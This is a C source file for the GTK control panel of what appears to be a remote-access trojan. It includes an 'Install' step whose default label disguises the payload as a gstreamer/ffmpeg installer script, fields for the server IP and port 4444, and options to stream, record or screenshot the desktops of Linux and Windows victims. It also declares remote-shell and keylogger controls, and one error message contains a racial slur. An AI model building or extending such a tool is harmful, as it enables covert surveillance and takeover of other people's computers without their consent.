#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/utils.h"
#include "../includes/constants.h"
#include "../includes/callback.h"

GtkWidget *log_entry;
const gchar *chemin;

const gchar *server_ip;
const char *server_port;
int port;

GtkWidget *text_view;
GtkWidget *main_win;

GtkWidget *ubuntu_button[4];
GtkWidget *mint_button[4];
GtkWidget *debian_button[4];
GtkWidget *kali_button[4];

void get_file_name()
{
    char invertFileName[256] = "";
    char fileName[256] = "";
    size_t i = 0,j = 0,k = 0, l = 0, m = 0;
    char temp = 0;

    sprintf(invertFileName, "%s", chemin);

    /* Inversion du path */
    j = strlen(invertFileName) - 1;
    i = 0;
    while(i < j)
    {
        temp = invertFileName[i];
        invertFileName[i] = invertFileName[j];
        invertFileName[j] = temp;
        i++;
        j--;
    }

    /* On isole le nom du fichier qui sera a l'envers */
    while(invertFileName[k] != '/')
    {
        fileName[k] = invertFileName[k];
        k++;
    }

    /* On remet le nom a l'endroit */
    m = strlen(fileName) - 1;
    while(l < m)
    {
        temp = fileName[l];
        fileName[l] = fileName[m];
        fileName[m] = temp;
        l++;
        m--;
    }

    gtk_entry_set_text(GTK_ENTRY(log_entry), fileName);

    return;
}

void wait_end_of_record(float total_time)
{
    clock_t end_of_record = clock() + ((clock_t)total_time * CLOCKS_PER_SEC);

    while(clock() < end_of_record);

    return;
}

/*  check if user is root */
void get_root()
{
    if(getuid() != 0)
    {
        printf("Must be Root nigga !\n");
        exit(-1);
    }
}

void nEraser(char *chaine)
{
    size_t i = 0;

    for(i = 0; i < strlen(chaine); i++)
    {
        if(chaine[i] == '\n')
            chaine[i] = '\0';
    }
}

void clean_buffer(char *buffer)
{
    memset(buffer, 0, strlen(buffer) + 1);

    return;
}


void close_connection()
{
    SOCKET connection_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;

    size_t flag_connection = 12;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    connection_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(connection_sock == SOCKET_ERROR)
    {
        error("socket() connection_sock", "close_connection()");
        exit(-1);
    }

    err = connect(connection_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "close_connection()");
        exit(-1);
    }

    if(send(connection_sock, (char*)&flag_connection, sizeof(flag_connection), 0) == SOCKET_ERROR)
    {
        error("send() flag_connection", "close_connection()");
        exit(-1);
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Server connection closed ...\n", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text. */
    g_print("%s", text);

    g_free(text);

    return;
}


/* Set the differents windows skins */

/* Windows Skin N°1 */
void set_skin_number_one(GtkWidget *zone)
{
    /* General Vars */
    GtkWidget *frame[6] = {NULL};
    GtkWidget *sub_frame[2] = {NULL};

    GtkWidget *skin1_background = NULL;
    GtkWidget *skin1_background2 = NULL;
    GtkWidget *skin1_background3 = NULL;
    GtkWidget *skin1_background4 = NULL;
    GtkWidget *death_face_image = NULL;

    //GtkWidget *install_image = NULL;

    char *IP = NULL;

    /* Disconnect from server */
    GtkWidget *ubuntu_disconnect = NULL;
    GtkWidget *mint_disconnect = NULL;
    GtkWidget *debian_disconnect = NULL;
    GtkWidget *kali_disconnect = NULL;

    /* text view on the left side */
    GtkWidget *scrollbar = NULL;

    /* Frame 0 Vars */
    GtkWidget *ip_server = NULL;
    GtkWidget *port_server = NULL;
    GtkWidget *IP_button = NULL;
    GtkWidget *port_button = NULL;

    GtkWidget *log_button = NULL;
    GtkWidget *upload_button = NULL;

    GtkWidget *skin_1 = NULL;
    GtkWidget *skin_2 = NULL;
    GtkWidget *skin_3 = NULL;
    GtkWidget *credits = NULL;

    /* Frame 1 Vars */

    /* Sub Frame 0 Vars */
    GtkWidget *distrib_zone[3] = {NULL};
    GtkWidget *note_book = {NULL};
    GtkWidget *tab_label[3] = {NULL};

    gchar *ubuntu_tab_label = NULL;
    gchar *kali_tab_label = NULL;
    gchar *mint_tab_label = NULL;
    gchar *debian_tab_label = NULL;

    GtkWidget *BG_logo[4] = {NULL};

    /* Sub Frame 1 Vars */
    GtkWidget *windows_zone[3] = {NULL};

    GtkWidget *windows_note_book = {NULL};
    GtkWidget *windows_tab_label[3] = {NULL};

    gchar *windows7_tab_label = NULL;
    gchar *windows8_tab_label = NULL;
    gchar *windows10_tab_label = NULL;

    GtkWidget *windows_BG_logo[3] = {NULL};

    /* Windows tab vars */
    GtkWidget *windows7_button[3] = {NULL};
    GtkWidget *windows8_button[3] = {NULL};
    GtkWidget *windows10_button[3] = {NULL};

    /* Windows7 Labels Vars */
    GtkWidget *windows7_label_watch = NULL;
    GtkWidget *windows7_label_record = NULL;
    GtkWidget *windows7_label_screenshot = NULL;
    GtkWidget *windows7_label_multi_screenshot = NULL;

    /* Windows8 Labels Vars */
    GtkWidget *windows8_label_watch = NULL;
    GtkWidget *windows8_label_record = NULL;
    GtkWidget *windows8_label_screenshot = NULL;
    GtkWidget *windows8_label_multi_screenshot = NULL;

    /* Windows10 Labels Vars */
    GtkWidget *windows10_label_watch = NULL;
    GtkWidget *windows10_label_record = NULL;
    GtkWidget *windows10_label_screenshot = NULL;
    GtkWidget *windows10_label_multi_screenshot = NULL;

    /* Remote shell vars */
    GtkWidget *rs_entry = NULL;
    GtkWidget *rs_send = NULL;
    GtkWidget *rs_start = NULL;

    /* Keylogger Vars */
    GtkWidget *run_keylogger = NULL;
    GtkWidget *log_file = NULL;

    /* Labels Vars */
    GtkWidget *ubuntu_label_watch = NULL;
    GtkWidget *ubuntu_label_record = NULL;
    GtkWidget *ubuntu_label_screenshot = NULL;
    GtkWidget *ubuntu_label_multi_screenshot = NULL;

    GtkWidget *mint_label_watch = NULL;
    GtkWidget *mint_label_record = NULL;
    GtkWidget *mint_label_screenshot = NULL;
    GtkWidget *mint_label_multi_screenshot = NULL;

    GtkWidget *debian_label_watch = NULL;
    GtkWidget *debian_label_record = NULL;
    GtkWidget *debian_label_screenshot = NULL;
    GtkWidget *debian_label_multi_screenshot = NULL;

    GtkWidget *kali_label_watch = NULL;
    GtkWidget *kali_label_record = NULL;
    GtkWidget *kali_label_screenshot = NULL;
    GtkWidget *kali_label_multi_screenshot = NULL;

    gchar *utf8_watch = NULL;
    gchar *utf8_record = NULL;
    gchar *utf8_screenshot = NULL;
    gchar *utf8_multi_screenshot = NULL;

    /* Background uni color image */
    skin1_background = gtk_image_new_from_file("IMG/BG_Black.png");
    gtk_fixed_put(GTK_FIXED(zone), skin1_background, 0, 0);

    skin1_background2 = gtk_image_new_from_file("IMG/Spiral2.jpg");
    gtk_fixed_put(GTK_FIXED(zone), skin1_background2, 250, 20);

    skin1_background3 = gtk_image_new_from_file("IMG/Spiral1.jpg");
    gtk_fixed_put(GTK_FIXED(zone), skin1_background3, 250, 230);

    skin1_background4 = gtk_image_new_from_file("IMG/fractal3.jpeg");
    gtk_fixed_put(GTK_FIXED(zone), skin1_background4, 10, 233);

    death_face_image = gtk_image_new_from_file("IMG/dark_face.png");
    gtk_fixed_put(GTK_FIXED(zone), death_face_image, 0, 0);

    /* Frame 2 (Text_View) */
    frame[2] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[2]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[2]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[2]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[2], 540, 160);
    gtk_fixed_put(GTK_FIXED(zone), frame[2], 250, 430);

    /* scrolled window on the side of the windows */
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone), scrollbar, 260, 450);
    gtk_widget_set_size_request(scrollbar, 520, 130);

    /* Side window (log) */
    text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(text_view, 320, 400);

    /* Frame 0 (Upload) */
    frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[0]), "- Upload / install - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[0], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[0], 250, 10);

    log_entry = gtk_entry_new_with_max_length(40);
    gtk_entry_set_text(GTK_ENTRY(log_entry), "gstreamer/ffmpeg installer script");
    gtk_widget_set_size_request(log_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_entry, 270, 150);

    ip_server = gtk_entry_new_with_max_length(15);
    gtk_entry_set_text(GTK_ENTRY(ip_server), "Server IP");
    gtk_widget_set_size_request(ip_server, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), ip_server, 270, 100);

    port_server = gtk_entry_new_with_max_length(5);
    gtk_entry_set_text(GTK_ENTRY(port_server), "4444");
    gtk_widget_set_size_request(port_server, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_server, 430, 100);

    IP_button = gtk_button_new_with_label("Set Server IP");
    gtk_widget_set_size_request(IP_button, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), IP_button, 270 , 50);
    g_signal_connect(G_OBJECT(IP_button), "clicked", G_CALLBACK(get_server_ip), ip_server);

    port_button = gtk_button_new_with_label("Set Port");
    gtk_widget_set_size_request(port_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_button, 430, 50);
    g_signal_connect(G_OBJECT(port_button), "clicked", G_CALLBACK(get_server_port), port_server);

    log_button = gtk_button_new_with_label("Browse");
    gtk_widget_set_size_request(log_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_button, 520 , 150);
    g_signal_connect(G_OBJECT(log_button), "clicked", G_CALLBACK(open_file), log_entry);

    upload_button = gtk_button_new_with_label("Install");
    gtk_widget_set_size_request(upload_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), upload_button, 640 , 150);
    g_signal_connect(G_OBJECT(upload_button), "clicked", G_CALLBACK(upload), NULL);

    skin_1 = gtk_button_new_with_label("Set Skin N°1");
    gtk_widget_set_size_request(skin_1, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_1, 550 , 50);
    //g_signal_connect(G_OBJECT(skin_1), "clicked", G_CALLBACK(cb_set_skin_1), zone);

    skin_2 = gtk_button_new_with_label("Set Skin N°2");
    gtk_widget_set_size_request(skin_2, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_2, 550 , 100);
    g_signal_connect(G_OBJECT(skin_2), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    skin_3 = gtk_button_new_with_label("Set Skin N°3");
    gtk_widget_set_size_request(skin_3, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_3, 670 , 50);
    g_signal_connect(G_OBJECT(skin_3), "clicked", G_CALLBACK(cb_set_skin_3), zone);

    credits = gtk_button_new_with_label("Credits");
    gtk_widget_set_size_request(credits, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), credits, 670 , 100);
    //g_signal_connect(G_OBJECT(credits), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    /* Frame 1 (Command) */
    frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[1]), "- Execute a Command - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[1], 450, 580);
    gtk_fixed_put(GTK_FIXED(zone), frame[1], 800, 10);

    /* Sub Frame 0 (Ubuntu Commands) */
    sub_frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[0]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[0], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[0], 820, 50);

    /* Creating zone for each tabs of the sub frame */
    distrib_zone[0] = gtk_fixed_new();
    distrib_zone[1] = gtk_fixed_new();
    distrib_zone[2] = gtk_fixed_new();
    distrib_zone[3] = gtk_fixed_new();

    /*  Creating tabs */
    note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[0]), note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(note_book), TRUE);

    /* Distrib Background color for each tabs */
    BG_logo[0] = gtk_image_new_from_file("IMG/BG_Ubuntu.jpg");
    BG_logo[1] = gtk_image_new_from_file("IMG/Mint19_BG.jpeg");
    BG_logo[2] = gtk_image_new_from_file("IMG/debian_brand_logo.jpg");
    BG_logo[3] = gtk_image_new_from_file("IMG/BG_Kali_2.jpg");

    ubuntu_tab_label    = g_strdup_printf("Ubuntu 16.04");
    mint_tab_label      = g_strdup_printf("Mint 19");
    debian_tab_label    = g_strdup_printf("Debian 9");
    kali_tab_label      = g_strdup_printf("Kali Linux 2.0");

    tab_label[0] = gtk_label_new(ubuntu_tab_label);
    tab_label[1] = gtk_label_new(mint_tab_label);
    tab_label[2] = gtk_label_new(debian_tab_label);
    tab_label[3] = gtk_label_new(kali_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[0], tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[1], tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[2], tab_label[2]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[3], tab_label[3]);

    /* Insert background color on each tabs */
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), BG_logo[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), BG_logo[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), BG_logo[2], 0, 0);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), BG_logo[3], 0, 0);

    /* Create command text labels */
    ubuntu_label_watch = gtk_label_new(NULL);
    ubuntu_label_record = gtk_label_new(NULL);
    ubuntu_label_screenshot = gtk_label_new(NULL);
    ubuntu_label_multi_screenshot = gtk_label_new(NULL);

    mint_label_watch = gtk_label_new(NULL);
    mint_label_record = gtk_label_new(NULL);
    mint_label_screenshot = gtk_label_new(NULL);
    mint_label_multi_screenshot = gtk_label_new(NULL);

    debian_label_watch = gtk_label_new(NULL);
    debian_label_record = gtk_label_new(NULL);
    debian_label_screenshot = gtk_label_new(NULL);
    debian_label_multi_screenshot = gtk_label_new(NULL);

    kali_label_watch = gtk_label_new(NULL);
    kali_label_record = gtk_label_new(NULL);
    kali_label_screenshot = gtk_label_new(NULL);
    kali_label_multi_screenshot = gtk_label_new(NULL);

    utf8_watch = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Watch desktop on streamming.</span>\n", -1, NULL, NULL, NULL);
    utf8_record = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Record desktop during n seconds.</span>\n", -1, NULL, NULL, NULL);
    utf8_screenshot = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Take a screenshot.</span>\n", -1, NULL, NULL, NULL);
    utf8_multi_screenshot = g_locale_to_utf8("<span foreground=\"#FFFFFF\">Take multiples screenshots in n secondes.</span>\n", -1, NULL, NULL, NULL);

    gtk_label_set_markup(GTK_LABEL(ubuntu_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(mint_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(mint_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(mint_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(mint_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(debian_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(debian_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(debian_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(debian_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(kali_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(kali_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(kali_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(kali_label_multi_screenshot), utf8_multi_screenshot);

    /* Ubuntu tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_multi_screenshot, 40, 115);

    /* Mint tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_multi_screenshot, 40, 115);

    /* Debian tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_multi_screenshot, 40, 115);

    /* Kali tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_multi_screenshot, 40, 115);

    /* Ubuntu tab */
    ubuntu_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[0] , 10 , 20);
    g_signal_connect(G_OBJECT(ubuntu_button[0] ), "toggled", G_CALLBACK(cb_ubuntu_watch), IP);

    ubuntu_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(ubuntu_button[1]), "toggled", G_CALLBACK(cb_ubuntu_record), NULL);

    ubuntu_button[2]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(ubuntu_button[2]), "toggled", G_CALLBACK(cb_ubuntu_screenshot), NULL);

    ubuntu_button[3]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(ubuntu_button[3]), "toggled", G_CALLBACK(cb_ubuntu_mutli_screenshot), NULL);

    /* Close server connection */
    ubuntu_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(ubuntu_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(ubuntu_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    mint_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(mint_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(mint_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    debian_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(debian_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(debian_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    kali_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(kali_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(kali_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    /* Mint tab */
    mint_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(mint_button[0]), "toggled", G_CALLBACK(cb_mint_watch), IP);

    mint_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(mint_button[1]), "toggled", G_CALLBACK(cb_mint_record), NULL);

    mint_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(mint_button[2]), "toggled", G_CALLBACK(cb_mint_screenshot), NULL);

    mint_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(mint_button[3]), "toggled", G_CALLBACK(cb_mint_mutli_screenshot), NULL);

    /* Debian tab */
    debian_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(debian_button[0]), "toggled", G_CALLBACK(cb_debian_watch), IP);

    debian_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(debian_button[1]), "toggled", G_CALLBACK(cb_debian_record), NULL);

    debian_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(debian_button[2]), "toggled", G_CALLBACK(cb_debian_screenshot), NULL);

    debian_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(debian_button[3]), "toggled", G_CALLBACK(cb_debian_mutli_screenshot), NULL);

    /* Kali tab */
    kali_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(kali_button[0]), "toggled", G_CALLBACK(cb_kali_watch), IP);

    kali_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(kali_button[1]), "toggled", G_CALLBACK(cb_kali_record), NULL);

    kali_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(kali_button[2]), "toggled", G_CALLBACK(cb_kali_screenshot), NULL);

    kali_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(kali_button[3]), "toggled", G_CALLBACK(cb_kali_mutli_screenshot), NULL);

    /* Sub frame 1 (Windows cmds) */
    sub_frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[1]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[1], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[1], 820, 320);

    /* Creating zone for each tabs of the windows sub frame */
    windows_zone[0] = gtk_fixed_new();
    windows_zone[1] = gtk_fixed_new();
    windows_zone[2] = gtk_fixed_new();

    /*  Creating tabs */
    windows_note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[1]), windows_note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(windows_note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(windows_note_book), TRUE);

    /* Distrib Background color for each tabs */
    windows_BG_logo[0] = gtk_image_new_from_file("IMG/Windows_IMG/windows7_BG2.jpg");
    windows_BG_logo[1] = gtk_image_new_from_file("IMG/Windows_IMG/windows8_BG2.jpeg");
    windows_BG_logo[2] = gtk_image_new_from_file("IMG/Windows_IMG/Windows10_BG2.jpg");

    windows7_tab_label  = g_strdup_printf("Windows 7");
    windows8_tab_label  = g_strdup_printf("Windows 8");
    windows10_tab_label = g_strdup_printf("Windows 10");

    windows_tab_label[0] = gtk_label_new(windows7_tab_label);
    windows_tab_label[1] = gtk_label_new(windows8_tab_label);
    windows_tab_label[2] = gtk_label_new(windows10_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[0], windows_tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[1], windows_tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[2], windows_tab_label[2]);

    /* Insert background color on each tabs */
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows_BG_logo[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows_BG_logo[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows_BG_logo[2], 0, 0);

    /* Windows 7 tab */
    windows7_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 8 tab */
    windows8_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 10 tab */
    windows10_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[1], 10 , 50);
